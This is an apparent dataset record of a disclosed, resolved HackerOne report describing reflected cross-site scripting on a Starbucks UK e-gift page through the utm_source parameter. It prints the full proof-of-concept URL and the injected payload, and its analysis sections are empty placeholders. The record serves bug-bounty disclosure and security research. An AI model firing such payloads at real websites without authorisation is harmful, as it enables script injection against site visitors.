---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '140616'
original_report_id: '140616'
title: www.starbucks.co.uk Reflected XSS via utm_source parameter
weakness: Cross-site Scripting (XSS) - Generic
team_handle: starbucks
created_at: '2016-05-24T02:11:53.397Z'
disclosed_at: '2016-12-19T22:48:31.074Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 35
asset_identifier: www.starbucks.co.uk
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# www.starbucks.co.uk Reflected XSS via utm_source parameter

## Metadata

- HackerOne Report ID: 140616
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: starbucks
- Disclosed At: 2016-12-19T22:48:31.074Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

https://www.starbucks.co.uk/shop/card/egift?utm_campaign=egift&utm_content=WinterFY16&utm_medium=GPH&utm_source=SBUXcouk"%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e

Payload: "%3e%3cb%20onbeforescriptexecute=prompt(document.domain)%3e

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
